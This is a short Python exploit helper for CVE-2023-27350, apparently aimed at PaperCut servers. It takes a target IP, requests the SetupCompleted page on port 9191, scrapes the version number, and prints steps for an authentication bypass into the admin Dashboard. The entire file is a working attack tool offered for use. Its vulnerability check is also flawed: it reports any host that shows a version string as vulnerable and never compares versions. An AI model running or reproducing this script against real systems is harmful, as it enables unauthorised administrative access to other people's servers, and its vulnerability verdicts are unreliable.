import requests
from bs4 import BeautifulSoup
import re
import pyfiglet

def vuln_version():
    # Print ASCII banner
    banner = pyfiglet.figlet_format("CVE-2023-27350", font="small")
    print(banner)
    print("made by: @MaanVader")
    print("updated: @Iman")
    print("")
    ip = input("Enter the IP address: ")
    url = "http://" + ip + ":9191/app?service=page/SetupCompleted"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    text_div = soup.find('div', class_='text')
    product_span = text_div.find('span', class_='product')

    # Search for the first span element containing a version number
    version_span = None
    for span in text_div.find_all('span'):
        version_match = re.match(r'^\d+\.\d+\.\d+$', span.text.strip())
        if version_match:
            version_span = span
            break

    if version_span is None:
        print('Not Vulnerable')
    else:
        version_str = version_span.text.strip()
        print('Version:', version_str)
        print('HTTP Status Code:', response.status_code)
        print(f"1) Visit this URL > {url}") 
        print(f"2) Login Authentication Bypass > http://{ip}:9191/app?service=page/Dashboard")


if __name__ == '__main__':
    vuln_version()
